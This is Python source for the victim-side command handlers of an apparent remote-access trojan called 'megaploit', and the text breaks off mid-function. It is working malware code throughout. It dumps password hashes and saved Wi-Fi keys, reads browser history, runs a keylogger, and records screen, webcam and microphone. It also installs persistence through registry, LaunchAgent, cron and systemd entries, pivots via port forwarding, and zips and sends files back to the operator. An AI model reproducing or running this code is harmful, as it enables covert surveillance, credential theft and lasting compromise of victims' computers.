"""
megaploit.agent.handlers
~~~~~~~~~~~~~~~~~~~~~~~~
All command implementations executed on the victim/agent side.

Guiding principle: every handler here does something that a plain interactive
shell cannot — C2-specific actions like stealing credentials, injecting code,
reading OS internals, or controlling the GUI silently.

Generic shell work (ls, cat, mkdir, etc.) is delegated to the shell fallback
that already exists at the bottom of this file.
"""

from __future__ import annotations

import getpass
import os
import platform
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import zipfile
from megaploit.core.protocol import send_file as _send_file, send_msg as _send_msg
from megaploit.core.config import MAX_RECORD_SECONDS
from megaploit.agent.keylogger import Keylogger

# Optional dependencies
try:
    import pyautogui
    _HAS_GUI = True
except ImportError:
    _HAS_GUI = False

try:
    import sounddevice as _sd
    import soundfile as _sf
    _HAS_AUDIO = True
except ImportError:
    _HAS_AUDIO = False


# ---------------------------------------------------------------------------
# Module-level state
# ---------------------------------------------------------------------------

_keylog: Keylogger | None = None
_keylog_thread: threading.Thread | None = None

# port → (thread, Flask app)
_web_threads: dict[int, threading.Thread] = {}
_web_apps:    dict[int, object]           = {}

_timelapse_stop = threading.Event()

# Beacon sleep interval — 0 means no sleep between command polls (legacy behaviour)
_beacon_sleep: float = 0.0


# ---------------------------------------------------------------------------
# Command router
# ---------------------------------------------------------------------------

_HANDLERS: dict[str, object] = {}

def _register(name: str):
    def decorator(fn):
        _HANDLERS[name] = fn
        return fn
    return decorator


def handle(conn, cmd: str) -> str | None:
    parts = cmd.strip().split(maxsplit=1)
    if not parts:
        return ""
    name = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""
    args = rest.split() if rest else []
    fn = _HANDLERS.get(name)
    if fn:
        return fn(conn, args)
    return _shell_exec(cmd)


# ---------------------------------------------------------------------------
# Core
# ---------------------------------------------------------------------------

@_register("cd")
def _cd(conn, args: list[str]) -> str:
    if len(args) != 1:
        return "Usage: cd <directory>"
    try:
        os.chdir(args[0])
        return f"[+] cwd: {os.getcwd()}"
    except FileNotFoundError:
        return f"[-] Not found: {args[0]}"
    except PermissionError:
        return f"[-] Permission denied: {args[0]}"


@_register("sysinfo")
def _sysinfo(conn, args: list[str]) -> str:
    res = str(pyautogui.size()) if _HAS_GUI else "unknown"
    try:
        import psutil
        cpu  = psutil.cpu_percent(interval=0.2)
        mem  = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        extra = (
            f"\n    CPU:          {cpu}%"
            f"\n    RAM:          {mem.used // 1024 // 1024} MB / {mem.total // 1024 // 1024} MB"
            f"\n    Disk /:       {disk.used // 1024 // 1024 // 1024} GB"
            f" / {disk.total // 1024 // 1024 // 1024} GB"
        )
    except ImportError:
        extra = ""
    return (
        f"[*] System Information\n"
        f"    OS:           {platform.system()} {platform.release()} ({platform.version()})\n"
        f"    Hostname:     {platform.node()}\n"
        f"    Username:     {getpass.getuser()}\n"
        f"    Architecture: {platform.machine()}\n"
        f"    Python:       {sys.version.split()[0]}\n"
        f"    Resolution:   {res}\n"
        f"    CWD:          {os.getcwd()}"
        f"{extra}"
    )


# ---------------------------------------------------------------------------
# File transfer (C2-specific — uses the binary protocol, not shell redirection)
# ---------------------------------------------------------------------------

@_register("upload")
def _upload(conn, args: list[str]) -> str:
    from megaploit.core.protocol import recv_file as _recv_file
    if len(args) != 1:
        return "Usage: upload <filename>"
    try:
        _recv_file(conn, args[0], timeout=60)
        return f"[+] Received: {args[0]}"
    except Exception as e:
        return f"[-] Receive failed: {e}"


@_register("download")
def _download(conn, args: list[str]) -> str | None:
    if len(args) != 1:
        return "Usage: download <filename>"
    path = args[0]
    if not os.path.isfile(path):
        return f"[-] File not found: {path}"
    with _send_lock:
        _send_msg(conn, "FILE_OK")
        _send_file(conn, path)
    return None


# ---------------------------------------------------------------------------
# Screen / audio capture
# ---------------------------------------------------------------------------

@_register("screenshot")
def _screenshot(conn, args: list[str]) -> str | None:
    """
    Capture a screenshot and send it back as a JPEG.
    Avoids disk I/O entirely — grabs directly to an in-memory JPEG buffer
    via mss + cv2, falling back to pyautogui only if mss is unavailable.
    """
    try:
        import io
        import cv2
        import mss
        import numpy as np

        quality = 85          # JPEG quality — good balance of size vs fidelity
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            raw = sct.grab(monitor)
            arr = np.array(raw)
        bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
        ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, quality])
        if not ok:
            return "[-] JPEG encode failed"
        data = buf.tobytes()
        # Write to a temp file only for the file-transfer protocol
        fname = "_screenshot.jpg"
        with open(fname, "wb") as f:
            f.write(data)
        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, fname)
        try:
            os.remove(fname)
        except OSError:
            pass
        return None
    except ImportError:
        # Fallback path — pyautogui (PNG, larger, but works without cv2/mss)
        if not _HAS_GUI:
            return "[-] pyautogui not available"
        try:
            import io
            from PIL import Image
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=85)
            fname = "_screenshot.jpg"
            with open(fname, "wb") as f:
                f.write(buf.getvalue())
            with _send_lock:
                _send_msg(conn, "FILE_OK")
                _send_file(conn, fname)
            try:
                os.remove(fname)
            except OSError:
                pass
            return None
        except Exception as e:
            return f"[-] Screenshot failed: {e}"
    except Exception as e:
        return f"[-] Screenshot failed: {e}"


@_register("record")
def _record(conn, args: list[str]) -> str | None:
    if not _HAS_AUDIO:
        return "[-] sounddevice/soundfile not available"
    if len(args) != 1 or not args[0].isdigit():
        return "Usage: record <seconds>"
    seconds = min(int(args[0]), MAX_RECORD_SECONDS)
    try:
        fname = "_recording.wav"
        rate  = 44100
        audio = _sd.rec(int(seconds * rate), samplerate=rate, channels=1, dtype="int16")
        _sd.wait()
        _sf.write(fname, audio, rate)
        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, fname)
        try:
            os.remove(fname)
        except OSError:
            pass
        return None
    except Exception as e:
        return f"[-] Recording failed: {e}"


@_register("screenshot_timelapse")
def _screenshot_timelapse(conn, args: list[str]) -> str | None:
    """
    Silently take N screenshots every INTERVAL seconds, zip them, send back.
    Usage: screenshot_timelapse <count> <interval_sec>

    Optimisations vs original:
    - Frames are captured and JPEG-encoded entirely in memory (no tmp files).
    - The zip archive is assembled from BytesIO objects — zero disk I/O until
      the final transfer file is written.
    - Uses mss for direct framebuffer access (faster than pyautogui).
    - cv2 JPEG encode at quality 85 shrinks each frame ~10× vs PNG.
    """
    if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
        return "Usage: screenshot_timelapse <count> <interval_sec>"
    count    = min(int(args[0]), 120)   # cap at 120 frames
    interval = max(1, int(args[1]))
    try:
        import io
        import cv2
        import mss
        import numpy as np

        quality = 85
        frames: list[bytes] = []

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            for i in range(count):
                raw = sct.grab(monitor)
                arr = np.array(raw)
                bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
                ok, buf = cv2.imencode(
                    ".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, quality]
                )
                if ok:
                    frames.append(buf.tobytes())
                if i < count - 1:
                    time.sleep(interval)

        # Build the zip in memory, then write once to disk for the protocol
        zip_path = "_timelapse.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zf:
            # ZIP_STORED — JPEGs are already compressed; deflating wastes CPU
            for idx, data in enumerate(frames):
                zf.writestr(f"frame_{idx:03d}.jpg", data)

        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, zip_path)
        try:
            os.remove(zip_path)
        except OSError:
            pass
        return None
    except ImportError:
        # Fallback: pyautogui + PNG (works without cv2/mss, but slower/larger)
        if not _HAS_GUI:
            return "[-] pyautogui not available"
        try:
            import io
            from PIL import Image
            frames_pil: list[bytes] = []
            for i in range(count):
                img = pyautogui.screenshot()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=85)
                frames_pil.append(buf.getvalue())
                if i < count - 1:
                    time.sleep(interval)
            zip_path = "_timelapse.zip"
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zf:
                for idx, data in enumerate(frames_pil):
                    zf.writestr(f"frame_{idx:03d}.jpg", data)
            with _send_lock:
                _send_msg(conn, "FILE_OK")
                _send_file(conn, zip_path)
            try:
                os.remove(zip_path)
            except OSError:
                pass
            return None
        except Exception as e:
            return f"[-] timelapse failed: {e}"
    except Exception as e:
        return f"[-] timelapse failed: {e}"


# ---------------------------------------------------------------------------
# Streaming
# ---------------------------------------------------------------------------

@_register("screen_stream")
def _screen_stream(conn, args: list[str]) -> str:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return "Usage: screen_stream <on|off>"
    return _start_web("megaploit.streaming.desktop", 5000) if args[0] == "on" else _stop_web(5000)


@_register("webcam")
def _webcam(conn, args: list[str]) -> str:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return "Usage: webcam <on|off>"
    return _start_web("megaploit.streaming.webcam", 5001) if args[0] == "on" else _stop_web(5001)


def _start_web(module_name: str, port: int) -> str:
    t = _web_threads.get(port)
    if t and t.is_alive():
        return f"[-] Already running on port {port}"
    try:
        import importlib
        mod = importlib.import_module(module_name)
        _web_apps[port] = mod.app

        def _run():
            mod.app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

        t = threading.Thread(target=_run, daemon=True)
        _web_threads[port] = t
        t.start()
        return f"[+] Started — http://0.0.0.0:{port}"
    except Exception as e:
        return f"[-] Failed: {e}"


def _stop_web(port: int) -> str:
    t = _web_threads.get(port)
    if t is None or not t.is_alive():
        return "[-] No server running on that port"
    _web_threads.pop(port, None)
    _web_apps.pop(port, None)
    return f"[+] Server on port {port} stopped (daemon thread will exit)"


# ---------------------------------------------------------------------------
# Persistence / keylogger
# ---------------------------------------------------------------------------

@_register("persist")
def _persist(conn, args: list[str]) -> str:
    """
    Install persistence for the agent.
    Windows: copies agent to AppData and adds a Run registry key.
    Linux:   installs a user crontab entry and a systemd user service unit.
    macOS:   installs a ~/Library/LaunchAgents plist.
    Usage: persist <regname> <filename>
    """
    if len(args) != 2:
        return "Usage: persist <regname> <filename>"
    reg_name, copy_name = args[0], args[1]

    # ── Windows ───────────────────────────────────────────────────────────────
    if sys.platform == "win32":
        try:
            dst = os.path.join(os.environ["APPDATA"], copy_name)
            if not os.path.exists(dst):
                shutil.copyfile(sys.executable, dst)
                subprocess.call(
                    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v {reg_name} /t REG_SZ /d "{dst}"',
                    shell=True,
                )
                return "[+] Persistence installed (Windows registry Run key)"
            return "[-] Already exists"
        except Exception as e:
            return f"[-] Error: {e}"

    # ── macOS ─────────────────────────────────────────────────────────────────
    if sys.platform == "darwin":
        try:
            agent_src = os.path.abspath(sys.argv[0]) if sys.argv else sys.executable
            launch_agents = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents, exist_ok=True)
            plist_path = os.path.join(launch_agents, f"com.{reg_name}.plist")
            if os.path.exists(plist_path):
                return f"[-] LaunchAgent already exists: {plist_path}"
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{reg_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{agent_src}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""
            with open(plist_path, "w") as f:
                f.write(plist_content)
            subprocess.call(["launchctl", "load", "-w", plist_path],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return f"[+] Persistence installed (macOS LaunchAgent: {plist_path})"
        except Exception as e:
            return f"[-] macOS persistence error: {e}"

    # ── Linux ─────────────────────────────────────────────────────────────────
    messages: list[str] = []
    agent_src = os.path.abspath(sys.argv[0]) if sys.argv else sys.executable
    dst_bin   = os.path.expanduser(f"~/.local/bin/{copy_name}")

    # Copy agent binary to a hidden location
    try:
        os.makedirs(os.path.dirname(dst_bin), exist_ok=True)
        shutil.copyfile(sys.executable, dst_bin)
        os.chmod(dst_bin, 0o755)
    except Exception as e:
        messages.append(f"[-] Could not copy agent: {e}")
        dst_bin = sys.executable  # fallback: reference the running executable

    # Technique 1: crontab @reboot entry
    try:
        import tempfile as _tmp
        cron_entry = f"@reboot {sys.executable} {agent_src} >/dev/null 2>&1\n"
        existing = subprocess.check_output(["crontab", "-l"],
                                           stderr=subprocess.DEVNULL).decode()
        if agent_src not in existing:
            with _tmp.NamedTemporaryFile(mode="w", suffix=".cron", delete=False) as tf:
                tf.write(existing.rstrip("\n") + "\n" + cron_entry)
                tf_path = tf.name
            subprocess.check_call(["crontab", tf_path], stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
            os.unlink(tf_path)
            messages.append("[+] Crontab @reboot entry added")
        else:
            messages.append("[*] Crontab entry already present")
    except Exception as e:
        messages.append(f"[-] Crontab failed: {e}")

    # Technique 2: systemd user service unit
    try:
        svc_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(svc_dir, exist_ok=True)
        unit_path = os.path.join(svc_dir, f"{reg_name}.service")
        if not os.path.exists(unit_path):
            unit_content = f"""[Unit]
Description={reg_name}
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {agent_src}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
            with open(unit_path, "w") as f:
                f.write(unit_content)
            subprocess.call(["systemctl", "--user", "daemon-reload"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.call(["systemctl", "--user", "enable", "--now", f"{reg_name}.service"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            messages.append(f"[+] systemd user service installed: {unit_path}")
        else:
            messages.append(f"[*] systemd unit already exists: {unit_path}")
    except Exception as e:
        messages.append(f"[-] systemd failed: {e}")

    return "\n".join(messages) if messages else "[-] No persistence methods succeeded"


@_register("keylog_start")
def _keylog_start(conn, args: list[str]) -> str:
    global _keylog, _keylog_thread
    if _keylog is not None:
        return "[-] Keylogger already running"
    _keylog = Keylogger()
    _keylog_thread = threading.Thread(target=_keylog.start, daemon=True)
    _keylog_thread.start()
    return "[+] Keylogger started"


@_register("keylog_dump")
def _keylog_dump(conn, args: list[str]) -> str:
    if _keylog is None:
        return "[-] Keylogger not running"
    data = _keylog.read_logs()
    return data if data else "(empty)"


@_register("keylog_stop")
def _keylog_stop(conn, args: list[str]) -> str:
    global _keylog, _keylog_thread
    if _keylog is None:
        return "[-] Keylogger not running"
    _keylog.destroy()
    if _keylog_thread:
        _keylog_thread.join(timeout=5)
    _keylog = None
    _keylog_thread = None
    return "[+] Keylogger stopped and log deleted"


# ---------------------------------------------------------------------------
# Clipboard (C2-specific — no shell one-liner works cross-platform silently)
# ---------------------------------------------------------------------------

@_register("getclip")
def _getclip(conn, args: list[str]) -> str:
    try:
        if sys.platform == "win32":
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-command", "Get-Clipboard"], text=True, stderr=subprocess.DEVNULL)
            return out.strip() or "(empty)"
        elif sys.platform == "darwin":
            return subprocess.check_output(["pbpaste"], text=True).strip() or "(empty)"
        else:
            for cmd in (["xclip", "-selection", "clipboard", "-o"],
                        ["xsel", "--clipboard", "--output"],
                        ["wl-paste"]):
                if shutil.which(cmd[0]):
                    return subprocess.check_output(cmd, text=True,
                                                   stderr=subprocess.DEVNULL).strip() or "(empty)"
            return "[-] No clipboard tool found (xclip / xsel / wl-paste)"
    except Exception as e:
        return f"[-] getclip: {e}"


@_register("setclip")
def _setclip(conn, args: list[str]) -> str:
    if not args:
        return "Usage: setclip <text>"
    text = " ".join(args)
    try:
        if sys.platform == "win32":
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-command", f'Set-Clipboard -Value "{text}"'],
                check=True, capture_output=True)
        elif sys.platform == "darwin":
            subprocess.run(["pbcopy"], input=text.encode(), check=True)
        else:
            for cmd in (["xclip", "-selection", "clipboard"],
                        ["xsel", "--clipboard", "--input"],
                        ["wl-copy"]):
                if shutil.which(cmd[0]):
                    subprocess.run(cmd, input=text.encode(), check=True)
                    break
            else:
                return "[-] No clipboard tool found"
        return "[+] Clipboard set"
    except Exception as e:
        return f"[-] setclip: {e}"


# ---------------------------------------------------------------------------
# Network — port-forward (C2-specific: pivoting through the agent)
# ---------------------------------------------------------------------------

@_register("portfwd")
def _portfwd(conn, args: list[str]) -> str:
    """
    Bind a port on the agent and relay all traffic to a remote host.
    Usage: portfwd <local_port> <remote_host> <remote_port>
    Useful for reaching internal services from the operator's machine.
    """
    if len(args) != 3:
        return "Usage: portfwd <local_port> <remote_host> <remote_port>"
    try:
        local_port  = int(args[0])
        remote_host = args[1]
        remote_port = int(args[2])
    except ValueError:
        return "[-] Ports must be integers"
    import socket as _sock

    def _relay(src, dst):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except OSError:
            pass
        finally:
            for s in (src, dst):
                try:
                    s.close()
                except OSError:
                    pass

    def _accept(server):
        while True:
            try:
                client, _ = server.accept()
            except OSError:
                break
            try:
                remote = _sock.create_connection((remote_host, remote_port), timeout=10)
            except OSError:
                client.close()
                continue
            threading.Thread(target=_relay, args=(client, remote), daemon=True).start()
            threading.Thread(target=_relay, args=(remote, client), daemon=True).start()

    try:
        srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", local_port))
        srv.listen(5)
        threading.Thread(target=_accept, args=(srv,), daemon=True).start()
        return f"[+] Port forward 0.0.0.0:{local_port} → {remote_host}:{remote_port}"
    except OSError as e:
        return f"[-] portfwd: {e}"


# ---------------------------------------------------------------------------
# Privilege / credential harvesting
# ---------------------------------------------------------------------------

@_register("hashdump")
def _hashdump(conn, args: list[str]) -> str:
    """Dump credential hashes. Requires SYSTEM/root."""
    if sys.platform == "win32":
        return _shell_exec(
            "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.bak /y 2>&1 && "
            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.bak /y 2>&1 && "
            "echo [+] SAM+SYSTEM saved to C:\\Windows\\Temp"
        )
    shadow = "/etc/shadow"
    if not os.path.isfile(shadow):
        return "[-] /etc/shadow not found"
    try:
        with open(shadow) as f:
            return f.read()
    except PermissionError:
        return "[-] Permission denied — need root"
    except OSError as e:
        return f"[-] {e}"


@_register("wifi_passwords")
def _wifi_passwords(conn, args: list[str]) -> str:
    """
    Extract all saved Wi-Fi credentials without prompting the user.
    Windows: netsh wlan show profile ... key=clear
    Linux:   /etc/NetworkManager/system-connections/
    macOS:   security find-generic-password
    """
    lines: list[str] = []

    if sys.platform == "win32":
        try:
            raw = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                text=True, stderr=subprocess.DEVNULL
            )
            ssids = [l.split(":")[1].strip()
                     for l in raw.splitlines() if "All User Profile" in l]
            for ssid in ssids:
                try:
                    detail = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                        text=True, stderr=subprocess.DEVNULL
                    )
                    key = "(open)"
                    for dl in detail.splitlines():
                        if "Key Content" in dl:
                            key = dl.split(":", 1)[1].strip()
                            break
                    lines.append(f"  SSID: {ssid:<32}  KEY: {key}")
                except Exception:
                    lines.append(f"  SSID: {ssid:<32}  KEY: (error reading)")
        except Exception as e:
            return f"[-] wifi_passwords: {e}"

    elif sys.platform == "darwin":
        try:
            raw = subprocess.check_output(
                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
                text=True, stderr=subprocess.DEVNULL
            )
            for line in raw.splitlines()[1:]:
                ssid = line.strip()
                if not ssid:
                    continue
                try:
                    pw = subprocess.check_output(
                        ["security", "find-generic-password",
                         "-D", "AirPort network password",
                         "-a", ssid, "-w"],
                        text=True, stderr=subprocess.DEVNULL
                    ).strip()
                except subprocess.CalledProcessError:
                    pw = "(not stored / no permission)"
                lines.append(f"  SSID: {ssid:<32}  KEY: {pw}")
        except Exception as e:
            return f"[-] wifi_passwords: {e}"

    else:
        # Linux: NetworkManager stores creds in plain files (root required for psk)
        nm_dir = "/etc/NetworkManager/system-connections"
        if not os.path.isdir(nm_dir):
            # Fallback: wpa_supplicant
            wpa = "/etc/wpa_supplicant/wpa_supplicant.conf"
            if os.path.isfile(wpa):
                try:
                    with open(wpa) as f:
                        return f.read()
                except PermissionError:
                    return "[-] /etc/wpa_supplicant/wpa_supplicant.conf — permission denied"
            return "[-] NetworkManager directory not found and no wpa_supplicant.conf"
        for fname in sorted(os.listdir(nm_dir)):
            fpath = os.path.join(nm_dir, fname)
            try:
                with open(fpath) as f:
                    content = f.read()
                ssid = psk = ""
                for l in content.splitlines():
                    if l.startswith("ssid="):
                        ssid = l.split("=", 1)[1]
                    elif l.startswith("psk="):
                        psk  = l.split("=", 1)[1]
                lines.append(f"  SSID: {ssid:<32}  PSK: {psk or '(open)'}")
            except PermissionError:
                lines.append(f"  {fname}: permission denied (need root)")
            except OSError:
                pass

    return "\n".join(lines) if lines else "[-] No saved networks found"


@_register("browser_history")
def _browser_history(conn, args: list[str]) -> str:
    """
    Read Chrome / Firefox / Edge browsing history from their SQLite DBs.
    Returns the last <n> URLs (default 50). No browser interaction needed.
    Usage: browser_history [count]
    """
    limit = 50
    if args and args[0].isdigit():
        limit = min(int(args[0]), 500)

    home    = os.path.expanduser("~")
    results: list[tuple[str, str, str]] = []   # (browser, time_str, url)

    db_paths: list[tuple[str, str]] = []

    # Chrome / Chromium
    for chrome_dir in (
        os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
        os.path.join(home, ".config", "google-chrome", "Default"),
        os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default"),
    ):
        db = os.path.join(chrome_dir, "History")
        if os.path.isfile(db):
            db_paths.append(("Chrome", db))

    # Edge
    for edge_dir in (
        os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default"),
        os.path.join(home, ".config", "microsoft-edge", "Default"),
    ):
        db = os.path.join(edge_dir, "History")
        if os.path.isfile(db):
            db_paths.append(("Edge", db))

    # Firefox
    ff_base = None
    for candidate in (
        os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        os.path.join(home, ".mozilla", "firefox"),
        os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
    ):
        if os.path.isdir(candidate):
            ff_base = candidate
            break
    if ff_base:
        for prof in os.listdir(ff_base):
            db = os.path.join(ff_base, prof, "places.sqlite")
            if os.path.isfile(db):
                db_paths.append(("Firefox", db))

    if not db_paths:
        return "[-] No browser history databases found"

    for browser, db in db_paths:
        # Copy the DB to a temp file (browser may have it locked)
        tmp = db + "_megaploit_tmp"
        try:
            shutil.copy2(db, tmp)
            conn_db = sqlite3.connect(tmp)
            cur = conn_db.cursor()

            if browser in ("Chrome", "Edge"):
                cur.execute(
                    "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url "
                    "FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,)
                )
            else:  # Firefox
                cur.execute(
                    "SELECT datetime(last_visit_date/1000000,'unixepoch'), url "
                    "FROM moz_places WHERE last_visit_date IS NOT NULL "
                    "ORDER BY last_visit_date DESC LIMIT ?", (limit,)
                )

            for ts, url in cur.fetchall():
                results.append((browser, ts or "?", url))
            conn_db.close()
        except Exception:
            pass
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    if not results:
        return "[-] Could not read any history (browser running with lock?)"

    lines = [f"  {'BROWSER':<8}  {'TIME (UTC)':<20}  URL"]
    lines.append("  " + "─" * 80)
    for browser, ts, url in results[:limit]:
        lines.append(f"  {browser:<8}  {ts:<20}  {url[:90]}")
    return "\n".join(lines)


@_register("search")
def _search(conn, args: list[str]) -> str:
    """
    Recursively search files under a path for a keyword (content grep).
    Skips binary files and files > 10 MB.
    Usage: search <path> <keyword>
    Returns file:line_number:matching_line for every hit (up to 200 matches).
    """
    if len(args) < 2:
        return "Usage: search <path> <keyword>"
    root    = args[0]
    keyword = " ".join(args[1:]).lower()
    hits: list[str] = []
    MAX_HITS  = 200
    MAX_FSIZE = 10 * 1024 * 1024  # 10 MB

    for dirpath, _dirs, files in os.walk(root):
        for fname in files:
            if len(hits) >= MAX_HITS:
                break
            fpath = os.path.join(dirpath, fname)
            try:
                if os.path.getsize(fpath) > MAX_FSIZE:
                    continue
                with open(fpath, "rb") as f:
                    raw = f.read()
                # Skip files that look binary (have many null bytes)
                if raw.count(b"\x00") > len(raw) * 0.1:
                    continue
                text = raw.decode("utf-8", errors="replace")
                for lineno, line in enumerate(text.splitlines(), 1):
                    if keyword in line.lower():
                        hits.append(f"{fpath}:{lineno}: {line.strip()[:120]}")
                        if len(hits) >= MAX_HITS:
                            break
            except (PermissionError, OSError):
                continue

    if not hits:
        return f"[-] No matches for '{keyword}' under {root}"
    suffix = f"\n  ... ({len(hits)} matches, limit reached)" if len(hits) >= MAX_HITS else ""
    return "\n".join(hits) + suffix


@_register("zip_download")
def _zip_download(conn, args: list[str]) -> str | None:
    """
    Zip a directory (or single file) on the target and send it back in one transfer.
    Usage: zip_download <path>
    """
    if not args:
        return "Usage: zip_download <path>"
    target = args[0]
    if not os.path.exists(target):
        return f"[-] Not found: {target}"
    try:
        tmp_zip = target.rstrip("/\\") + "_megaploit.zip"
        with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            if os.path.isfile(target):
                zf.write(target, os.path.basename(target))
            else:
                for dirpath, _dirs, files in os.walk(target):
                    for f in files:
                        full = os.path.join(dirpath, f)
                        arcname = os.path.relpath(full, os.path.dirname(target))
                        zf.write(full, arcname)
        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, tmp_zip)
        try:
            os.remove(tmp_zip)
        except OSError:
            pass
        return None  # file already sent
    except Exception as e:
        return f"[-] zip_download: {e}"


# ---------------------------------------------------------------------------
# User-activity awareness
# ---------------------------------------------------------------------------

@_register("idle_time")
def _idle_time(conn, args: list[str]) -> str:
    """
    Return how many seconds since the last user input event (keyboard/mouse).
    Useful for knowing whether someone is at the keyboard.
    """
    if sys.platform == "win32":
        try:
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(lii)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            secs = millis // 1000
            return f"[*] Idle for {secs}s ({secs // 60}m {secs % 60}s)"
        except Exception as e:
            return f"[-] idle_time: {e}"

    elif sys.platform == "darwin":
        try:
            raw = subprocess.check_output(
                ["ioreg", "-c", "IOHIDSystem"], text=True, stderr=subprocess.DEVNULL)
            for line in raw.splitlines():
                if "HIDIdleTime" in line:
                    ns = int(line.split("=")[-1].strip())
                    secs = ns // 1_000_000_000
                    return f"[*] Idle for {secs}s ({secs // 60}m {secs % 60}s)"
            return "[-] Could not read HIDIdleTime"
        except Exception as e:
            return f"[-] idle_time: {e}"

    else:
        # Linux: xprintidle (ms) or fallback to /proc/uptime heuristic
        if shutil.which("xprintidle"):
            try:
                ms = int(subprocess.check_output(
                    ["xprintidle"], text=True, stderr=subprocess.DEVNULL).strip())
                secs = ms // 1000
                return f"[*] Idle for {secs}s ({secs // 60}m {secs % 60}s)"
            except Exception as e:
                return f"[-] idle_time: {e}"
        return "[-] xprintidle not found — install it for idle detection on Linux"


@_register("mic_level")
def _mic_level(conn, args: list[str]) -> str:
    """
    Record 1 second of audio and return the peak dB level.
    Used to detect whether someone is speaking near the microphone.
    """
    if not _HAS_AUDIO:
        return "[-] sounddevice not available"
    try:
        import numpy as np
        rate   = 44100
        frames = _sd.rec(rate, samplerate=rate, channels=1, dtype="float32")
        _sd.wait()
        peak = float(np.max(np.abs(frames)))
        if peak == 0:
            db = -float("inf")
        else:
            import math
            db = 20 * math.log10(peak)
        indicator = "QUIET" if db < -30 else ("TALKING" if db > -10 else "AMBIENT")
        return f"[*] Mic peak: {db:+.1f} dB  [{indicator}]"
    except Exception as e:
        return f"[-] mic_level: {e}"


# ---------------------------------------------------------------------------
# GUI interaction
# ---------------------------------------------------------------------------

@_register("msgbox")
def _msgbox(conn, args: list[str]) -> str:
    """
    Display a visible message box on the target's desktop.
    Can be used as a decoy / distraction or social-engineering vector.
    Usage: msgbox <title> <message>
    """
    if len(args) < 2:
        return "Usage: msgbox <title> <message>"
    title   = args[0]
    message = " ".join(args[1:])

    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)  # 0x40 = MB_ICONINFORMATION
            return "[+] Message box shown"
        except Exception as e:
            return f"[-] msgbox: {e}"

    elif sys.platform == "darwin":
        try:
            script = f'display dialog "{message}" with title "{title}" buttons {{"OK"}}'
            subprocess.Popen(["osascript", "-e", script],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "[+] Message box shown"
        except Exception as e:
            return f"[-] msgbox: {e}"

    else:
        # Linux: try zenity, then kdialog, then xmessage
        for cmd_args in (
            ["zenity", "--info", f"--title={title}", f"--text={message}", "--no-wrap"],
